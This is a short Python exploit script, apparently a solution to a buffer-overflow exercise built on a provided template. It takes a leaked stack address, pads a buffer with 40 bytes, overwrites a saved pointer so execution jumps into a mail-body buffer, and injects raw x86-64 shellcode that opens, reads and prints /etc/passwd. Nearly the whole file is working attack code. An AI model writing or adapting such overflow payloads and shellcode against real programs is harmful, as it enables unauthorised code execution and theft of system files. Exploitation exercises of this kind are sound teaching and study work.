#!/usr/bin/env python3
import sys
import struct

# make sure to use these functions to write strings or bytes (bytestring) so that the order is preserved
def writeStr(v):
    assert isinstance(v, str)
    sys.stdout.flush()
    sys.stdout.buffer.write(v.encode("ascii"))
    sys.stdout.flush()

def writeBytes(v):
    assert isinstance(v, bytes)
    sys.stdout.flush()
    sys.stdout.buffer.write(v)
    sys.stdout.flush()

def writeLong(v):
    assert isinstance(v, int)
    sys.stdout.flush()
    sys.stdout.buffer.write(v.to_bytes(8, 'little'))
    sys.stdout.flush()

# Use this to debug your attack.
def eprint(*args, **kwargs):
    print(*args, file=sys.stderr, **kwargs)

# TODO: Implement your solution here.
#print(0x7fffffffde68-0x7fffffffde40)
#print(0x7fffffffddc0-0x7fffffffde40)
#0x7fffffffddc0

mailSubj = int(sys.stdin.readline(), 16)
mailBody = mailSubj - 128 # distance is 128

writeStr("a"*40) # distance is 40
writeLong(mailBody) # go to mail_body
writeStr("\n")
writeBytes(b'\xeb?_\x80w\x0bAH1\xc0\x04\x02H1\xf6\x0f\x05f\x81\xec\xff\x0fH\x8d4$H\x89\xc7H1\xd2f\xba\xff\x0fH1\xc0\x0f\x05H1\xff@\x80\xc7\x01H\x89\xc2H1\xc0\x04\x01\x0f\x05H1\xc0\x04<\x0f\x05\xe8\xbc\xff\xff\xff/etc/passwdA') # injection of shellcode
writeStr("\n")